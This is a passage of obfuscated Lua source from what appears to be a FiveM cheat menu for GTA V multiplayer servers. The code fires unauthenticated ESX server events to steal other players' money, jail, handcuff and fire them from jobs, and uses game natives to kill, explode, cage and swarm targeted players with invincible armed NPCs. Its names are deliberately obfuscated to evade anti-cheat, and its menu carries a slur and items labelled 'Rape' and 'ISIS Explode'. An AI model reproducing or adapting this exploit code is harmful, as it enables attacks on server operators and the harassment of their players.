                    elseif IlIlIlIlIlI("Give Ammo") then
                        for i = 1, #faggot123 do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), Ggggg(faggot123[i]), 250)
                        end
                    elseif IlIlIlIlIlI("Give All Weapons") then
                        for i = 1, #faggot123 do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), Ggggg(faggot123[i]), 250, KZjx, KZjx)
                        end
                    elseif IlIlIlIlIlI("Remove All Weapons") then
                        for i = 1, #faggot123 do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), waduyh487r64)
                        end
                    elseif IlIlIlIlIlI("Give Vehicle") then
                        local ped = GetPlayerPed(SelectedPlayer)
                        local ModelName = pikgfrihfg("Enter Vehicle Spawn Name", "", 100)

                        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                            RequestModel(ModelName)
                            while not HasModelLoaded(ModelName) do
                                Citizen.Wait(0)
                            end

                            local vvvvvvvvvvvvvvvvvvvvvvvv = CreateVehicle(Ggggg(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), waduyh487r64, waduyh487r64)
                            adyt23h23("~g~Vehicle Given To Player!")
                        else
                            adyt23h23("~r~Model is not valid!")
                        end
					elseif IlIlIlIlIlI('Clone Car') then
                    ClonePedVeh()
					elseif IlIlIlIlIlI('Spawn Following Asshat') then
                    Citizen.CreateThread(function()
                    asshat = waduyh487r64
                    local target = GetPlayerPed(SelectedPlayer)
                    local assped = WADUI
                    local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
                    local vvvvvvvvvvvvvvvvvvvvvvvv = vehlist[math.random(#vehlist)]
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), KZjx) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = WADUI
                    RequestModel(vvvvvvvvvvvvvvvvvvvvvvvv)
                    RequestModel('s_m_y_hwaycop_01')
                    while not HasModelLoaded(vvvvvvvvvvvvvvvvvvvvvvvv) and not HasModelLoaded('s_m_m_security_01') do
                        RequestModel('s_m_y_hwaycop_01')
                        Citizen.Wait(0)
                        RequestModel(vvvvvvvvvvvvvvvvvvvvvvvv)
                    end
                    if HasModelLoaded(vvvvvvvvvvvvvvvvvvvvvvvv) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            vvvvvvvvvvvvvvvvvvvvvvvv,
                            pos.x - (xf * 10),
                            pos.y - (yf * 10),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        v1 =
                            CreateVehicle(
                            vvvvvvvvvvvvvvvvvvvvvvvv,
                            pos.x - (xf * 10) + 2,
                            pos.y - (yf * 10) + 2,
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        SetVehicleGravityAmount(v, 15.0)
                        SetVehicleGravityAmount(v1, 15.0)
                        SetEntityInvincible(v, waduyh487r64)
                        SetEntityInvincible(v1, waduyh487r64)
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('s_m_y_hwaycop_01')
                            Citizen.Wait(50)
                            if HasModelLoaded('s_m_y_hwaycop_01') then
                                Citizen.Wait(50)
                                local pas = CreatePed(21, Ggggg('s_m_y_swat_01'), pos.x, pos.y, pos.z, waduyh487r64, KZjx)
                                local pas1 = CreatePed(21, Ggggg('s_m_y_swat_01'), pos.x, pos.y, pos.z, waduyh487r64, KZjx)
                                local ped = CreatePed(21, Ggggg('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, waduyh487r64, KZjx)
                                local ped1 = CreatePed(21, Ggggg('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, waduyh487r64, KZjx)
                                assped = ped
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(pas, Ggggg('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(pas1, Ggggg('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped, Ggggg('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, Ggggg('WEAPON_APPISTOL'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v1, -1)
                                    SetPedIntoVehicle(pas, v, 0)
                                    SetPedIntoVehicle(pas1, v1, 0)
                                    TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    asstarget = target
                                    TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    SetDriverAbility(ped, 10.0)
                                    SetDriverAggressiveness(ped, 10.0)
                                    SetDriverAbility(ped1, 10.0)
                                    SetDriverAggressiveness(ped1, 10.0)
                                end
                            end
                        end
                    end
                end)
                    elseif IlIlIlIlIlI("Kick From Vehicle") then
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        adyt23h23("~g~Kicked Player From Vehicle!")
					elseif IlIlIlIlIlI("Kill Player") then
					SetEntityHealth(GetPlayerPed(SelectedPlayer), 0)
					SetEntityHealth(GetPlayerPedId(SelectedPlayer), 0)
                    elseif IlIlIlIlIlI("Spawn Flare On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y , coords.z, coords.x, coords.y, coords.z, 100, waduyh487r64, Ggggg("WEAPON_FLAREGUN"), PlayerPedId(), waduyh487r64, waduyh487r64, 100)
                    elseif IlIlIlIlIlI("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, waduyh487r64, Ggggg("WEAPON_SMOKEGRENADE"), GetPlayerPed(SelectedPlayer), waduyh487r64, waduyh487r64, 100)
                    end

                    ililililil()
                elseif Plane.IsMenuOpened("Player\69\83\88\77\101\110\117\10") then
                    if LDOWJDWDdddwdwdad("~r~→  ~s~ESX Triggers", "\80\108\97\121\101\114\69\83\88\84\114\105\103\103\101\114\77\101\110\117\10") then
                    elseif LDOWJDWDdddwdwdad("~r~→  ~s~ESX Jobs", "Player\69\83\88\74\111\98\77\101\110\117\10") then
                    end

                    ililililil()
                elseif Plane.IsMenuOpened("\80\108\97\121\101\114\69\83\88\84\114\105\103\103\101\114\77\101\110\117\10") then
                    if IlIlIlIlIlI("ESX Revive") then
					udwdj("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
                    udwdj("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer),GetPlayerServerId(selectedPlayer))
					udwdj("whoapd:revive", GetPlayerServerId(SelectedPlayer))
				    udwdj("paramedic:revive", GetPlayerServerId(SelectedPlayer))
				    udwdj("ems:revive", GetPlayerServerId(SelectedPlayer))
					local ax = GetPlayerPed(SelectedPlayer)
                    local bK = GetEntityCoords(ax)
                    udwdj('esx_ambulancejob:setDeathStatus', KZjx)
                    local dZ = {
                        x = ESX.Math.Round(bK.x, 1),
                        y = ESX.Math.Round(bK.y, 1),
                        z = ESX.Math.Round(bK.z, 1)
                    }
                    StopScreenEffect('DeathFailOut')
                    DoScreenFadeIn(800)
					elseif IlIlIlIlIlI("Fire player from job \40\126\103\126\69\83\88\126\115\126\41\10") then
				    FirePlayer(SelectedPlayer)
                    elseif IlIlIlIlIlI("ESX Give Money To Player From Your Wallet") then
                        local d = pikgfrihfg("Enter amount of money to give","",100)
                        if d ~= "" then
                            udwdj("esx:giveInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end
                    elseif IlIlIlIlIlI("ESX Steal Money From Player") then
                        local d=pikgfrihfg("Enter amount of money to steal","",100)
                        if d ~= "" then
                            udwdj("esx:removeInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end
                    elseif IlIlIlIlIlI("ESX Handcuff Player") then
                        udwdj("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif IlIlIlIlIlI("ESX Send To Jail") then
                        udwdj("esx-qalle-jail:jailPlayer",GetPlayerServerId(selectedPlayer),5000,"Jailed")
                           udwdj("esx_jailer:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                           udwdj("esx_jail:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                        udwdj("js:jailuser",GetPlayerServerId(selectedPlayer),45*60,"Jailed")
                    elseif IlIlIlIlIlI("ESX Get Out Of Jail") then
                        local ped = selectedPlayer
                        udwdj("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                        udwdj("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                        udwdj("esx_jail:sendToJail",GetPlayerServerId(ped),0)
                        udwdj("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                    end

                    ililililil()
                elseif Plane.IsMenuOpened("Player\69\83\88\74\111\98\77\101\110\117\10") then
                    if IlIlIlIlIlI("Unemployed") then
                        udwdj("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
                    elseif IlIlIlIlIlI("Police") then
                        udwdj("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"police",3)
                    elseif IlIlIlIlIlI("Mechanic") then
                        udwdj("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"mecano",3)
                    elseif IlIlIlIlIlI("Taxi") then
                        udwdj("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"taxi",3)
                    elseif IlIlIlIlIlI("Ambulance") then
                        udwdj("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"ambulance",3)
                    elseif IlIlIlIlIlI("Real Estate Agent") then
                        udwdj("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"realestateagent",3)
                    elseif IlIlIlIlIlI("Car Dealer") then
                        udwdj("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"cardealer",3)
                    end


                    ililililil()
                elseif Plane.IsMenuOpened("\80\108\97\121\101\114\84\114\111\108\108\77\101\110\117\10") then
                    if IlIlIlIlIlI ("Fake Chat Message") then
                        local cX=pikgfrihfg("Enter message to send","",100)
                        local cY=GetPlayerName(selectedPlayer)
                        if cX then
                            udwdj("_chat:messageEntered",cY,{0,0x99,255},cX)
                        end
				elseif IlIlIlIlIlI("Ram w/ Custom Vehicle") then
				local cPs = pikgfrihfg('Are you sure you want to ram the player? y/n', '', 0)
				if cPs == 'y' then
						local ModelName1 = pikgfrihfg("Enter Vehicle Name", "", 100)
				        if ModelName1 and IsModelValid(ModelName1) and IsModelAVehicle(ModelName1) then
                        local keduxben = Ggggg(ModelName1)
                        RequestModel(keduxben)
                        while not HasModelLoaded(keduxben) do
                            Citizen.Wait(0)
                        end
                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                        if HasModelLoaded(keduxben) then
                            local vvvvvvvvvvvvvvvvvvvvvvvv = CreateVehicle(keduxben, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), waduyh487r64, waduyh487r64)	
                            SetVehicleForwardSpeed(vvvvvvvvvvvvvvvvvvvvvvvv, 120.0)		
                        end		
											                    else
                        adyt23h23("~r~Model Isn't Valid You Tard")
						end
						elseif cPs == 'n' then
                        adyt23h23(
                            '~h~~r~Operation cancelled~s~.'
                        )
					    else
                        adyt23h23(
                            '~h~~r~Invalid Confirmation~s~.'
                        )
                        adyt23h23(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    end
				elseif IlIlIlIlIlI('~y~Explode ~s~Vehicle') then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), waduyh487r64) then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, KZjx, waduyh487r64, 0.0)
                    else
                        av('~h~~b~Player not in a vehicle~s~.', KZjx)
                    end
                elseif IlIlIlIlIlI('~r~Banana ~p~Party') then
                    local bH = CreateObject(Ggggg('p_crahsed_heli_s'), 0, 0, 0, waduyh487r64, waduyh487r64, waduyh487r64)
                    local bI = CreateObject(Ggggg('prop_rock_4_big2'), 0, 0, 0, waduyh487r64, waduyh487r64, waduyh487r64)
                    local bJ = CreateObject(Ggggg('prop_beachflag_le'), 0, 0, 0, waduyh487r64, waduyh487r64, waduyh487r64)
                    AttachEntityToEntity(
                        bH,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        waduyh487r64,
                        waduyh487r64,
                        KZjx,
                        waduyh487r64,
                        1,
                        waduyh487r64
                    )
                    AttachEntityToEntity(
                        bI,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        waduyh487r64,
                        waduyh487r64,
                        KZjx,
                        waduyh487r64,
                        1,
                        waduyh487r64
                    )
                    AttachEntityToEntity(
                        bJ,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        waduyh487r64,
                        waduyh487r64,
                        KZjx,
                        waduyh487r64,
                        1,
                        waduyh487r64
                    )
                elseif IlIlIlIlIlI('~r~ISIS Explode') then
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, waduyh487r64, KZjx, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, waduyh487r64, KZjx, waduyh487r64)
				elseif IlIlIlIlIlI("Small invisible Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, KZjx, waduyh487r64, 0)
                elseif IlIlIlIlIlI('~r~Rape') then
                    RequestModelSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(0)
                    end
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), waduyh487r64) then
                        local vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), waduyh487r64)
                        while not NetworkHasControlOfEntity(vvvvvvvvvvvvvvvvvvvvvvvv) do
                            NetworkRequestControlOfEntity(vvvvvvvvvvvvvvvvvvvvvvvv)
                            Citizen.Wait(0)
                        end
                        SetEntityAsMissionEntity(vvvvvvvvvvvvvvvvvvvvvvvv, waduyh487r64, waduyh487r64)
                        DeleteVehicle(vvvvvvvvvvvvvvvvvvvvvvvv)
                        DeleteEntity(vvvvvvvvvvvvvvvvvvvvvvvv)
                    end
                    count = -0.2
                    for b = 1, 3 do
                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64))
                        local bS = CreatePed(4, Ggggg('a_m_o_acult_01'), x, y, z, 0.0, waduyh487r64, KZjx)
                        SetEntityAsMissionEntity(bS, waduyh487r64, waduyh487r64)
                        AttachEntityToEntity(
                            bS,
                            GetPlayerPed(SelectedPlayer),
                            4103,
                            11816,
                            count,
                            0.00,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            KZjx,
                            KZjx,
                            KZjx,
                            KZjx,
                            2,
                            waduyh487r64
                        )
                        ClearPedTasks(GetPlayerPed(SelectedPlayer))
                        TaskPlayAnim(
                            GetPlayerPed(SelectedPlayer),
                            'rcmpaparazzo_2',
                            'shag_loop_poppy',
                            2.0,
                            2.5,
                            -1,
                            49,
                            0,
                            0,
                            0,
                            0
                        )
                        SetPedKeepTask(bS)
                        TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                        SetEntityInvincible(bS, waduyh487r64)
                        count = count - 0.4
                    end
                elseif IlIlIlIlIlI('~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = Ggggg(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, waduyh487r64, waduyh487r64, KZjx)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, waduyh487r64, waduyh487r64, KZjx)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, waduyh487r64)
                    FreezeEntityPosition(ea, waduyh487r64)
                elseif IlIlIlIlIlI('Wall ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, waduyh487r64, waduyh487r64, waduyh487r64)
                    AttachEntityToEntity(
                        ed,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        waduyh487r64,
                        waduyh487r64,
                        KZjx,
                        waduyh487r64,
                        1,
                        waduyh487r64
                    )
                elseif IlIlIlIlIlI('Wall ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, waduyh487r64, waduyh487r64, waduyh487r64)
                    AttachEntityToEntity(
                        ed,
                        GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), KZjx),
                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), KZjx), 'chassis'),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        waduyh487r64,
                        waduyh487r64,
                        KZjx,
                        waduyh487r64,
                        1,
                        waduyh487r64
                    )
                elseif IlIlIlIlIlI('Fuck Up ~s~Player') then
                    j = waduyh487r64
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local ee = 'sr_prop_spec_tube_xxs_01a'
                    local ef = Ggggg(ee)
                    RequestModel(ef)
                    RequestModel(smashhash)
                    while not HasModelLoaded(ef) do
                        Citizen.Wait(0)
                    end
                    local eg = CreateObject(ef, roundx, roundy, roundz - 5.0, waduyh487r64, waduyh487r64, KZjx)
                    SetEntityRotation(eg, 0.0, 90.0, 0.0)
                    local eh = -356333586
                    local bR = 'WEAPON_SNOWBALL'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(eg)
                        RequestModel(eh)
                        Citizen.Wait(50)
                        if HasModelLoaded(eh) then
                            local ped =
                                CreatePed(
                                21,
                                eh,
                                bK.x + math.sin(i * 2.0),
                                bK.y - math.sin(i * 2.0),
                                bK.z - 5.0,
                                0,
                                waduyh487r64,
                                waduyh487r64
                            ) and
                                CreatePed(
                                    21,
                                    eh,
                                    bK.x - math.sin(i * 2.0),
                                    bK.y + math.sin(i * 2.0),
                                    bK.z - 5.0,
                                    0,
                                    waduyh487r64,
                                    waduyh487r64
                                )
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, KZjx)
                                SetNetworkIdCanMigrate(ei, waduyh487r64)
                                SetNetworkIdExistsOnAllMachines(ei, waduyh487r64)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, Ggggg(bR), 9999, 1, 1)
                                SetCurrentPedWeapon(ped, Ggggg(bR), waduyh487r64)
                                SetEntityInvincible(ped, waduyh487r64)
                                SetPedCanSwitchWeapon(ped, waduyh487r64)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif IlIlIlIlIlI("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                        local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(Ggggg(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(Ggggg(mtlion)) then
                            local ped =
                                CreatePed(21, Ggggg(mtlion), co.x, co.y, co.z, 0, waduyh487r64, waduyh487r64)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, KZjx)
                                SetNetworkIdCanMigrate(ei, waduyh487r64)
                                SetNetworkIdExistsOnAllMachines(ei, waduyh487r64)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif IlIlIlIlIlI("~h~~r~Spawn ~s~Swat army with ~y~AK") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "WEAPON_ASSAULTRIFLE"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(Ggggg(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(Ggggg(bQ)) then
                            local ped =
                                CreatePed(21, Ggggg(bQ), bK.x + i, bK.y - i, bK.z, 0, waduyh487r64, waduyh487r64) and
                                CreatePed(21, Ggggg(bQ), bK.x - i, bK.y + i, bK.z, 0, waduyh487r64, waduyh487r64)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, KZjx)
                                SetNetworkIdCanMigrate(ei, waduyh487r64)
                                SetNetworkIdExistsOnAllMachines(ei, waduyh487r64)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, Ggggg(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, waduyh487r64)
                                SetPedCanSwitchWeapon(ped, waduyh487r64)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif IlIlIlIlIlI("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(Ggggg(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(Ggggg(bQ)) then
                            local ped =
                                CreatePed(21, Ggggg(bQ), bK.x + i, bK.y - i, bK.z, 0, waduyh487r64, waduyh487r64) and
                                CreatePed(21, Ggggg(bQ), bK.x - i, bK.y + i, bK.z, 0, waduyh487r64, waduyh487r64)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, KZjx)
                                SetNetworkIdCanMigrate(ei, waduyh487r64)
                                SetNetworkIdExistsOnAllMachines(ei, waduyh487r64)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, Ggggg(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, waduyh487r64)
                                SetPedCanSwitchWeapon(ped, waduyh487r64)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					
                elseif IlIlIlIlIlI("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_flaregun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(Ggggg(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(Ggggg(bQ)) then
                            local ped =
                                CreatePed(21, Ggggg(bQ), bK.x + i, bK.y - i, bK.z, 0, waduyh487r64, waduyh487r64) and
                                CreatePed(21, Ggggg(bQ), bK.x - i, bK.y + i, bK.z, 0, waduyh487r64, waduyh487r64)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, KZjx)
                                SetNetworkIdCanMigrate(ei, waduyh487r64)
                                SetNetworkIdExistsOnAllMachines(ei, waduyh487r64)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, Ggggg(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, waduyh487r64)
                                SetPedCanSwitchWeapon(ped, waduyh487r64)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif IlIlIlIlIlI("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(Ggggg(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(Ggggg(bQ)) then
                            local ped =
                                CreatePed(21, Ggggg(bQ), bK.x + i, bK.y - i, bK.z, 0, waduyh487r64, waduyh487r64) and
                                CreatePed(21, Ggggg(bQ), bK.x - i, bK.y + i, bK.z, 0, waduyh487r64, waduyh487r64)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, KZjx)
                                SetNetworkIdCanMigrate(ei, waduyh487r64)
                                SetNetworkIdExistsOnAllMachines(ei, waduyh487r64)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, Ggggg(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, waduyh487r64)
                                SetPedCanSwitchWeapon(ped, waduyh487r64)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif IlIlIlIlIlI("Rain Agressive NPC") then
                    local bQ = "mp_f_cocaine_01"
					local bR = "weapon_knife"
					for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(Ggggg(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(Ggggg(bQ)) then
                            local ped =
                                CreatePed(21, Ggggg(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, waduyh487r64, waduyh487r64)
							NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, KZjx)
                                SetNetworkIdCanMigrate(ei, waduyh487r64)
                                SetNetworkIdExistsOnAllMachines(ei, waduyh487r64)
                                Citizen.Wait(50)
                                NetToPed(ei)
								GiveWeaponToPed(ped, Ggggg(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, waduyh487r64)
								SetPedCanSwitchWeapon(ped, waduyh487r64)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
						end
                    end
                    elseif LDOWJDWDdddwdwdad("~r~→  ~s~Spawn Props On Player", "\83\112\97\119\110\80\114\111\112\115\77\101\110\117\10") then
                    elseif IlIlIlI(
                        "Freeze Player",
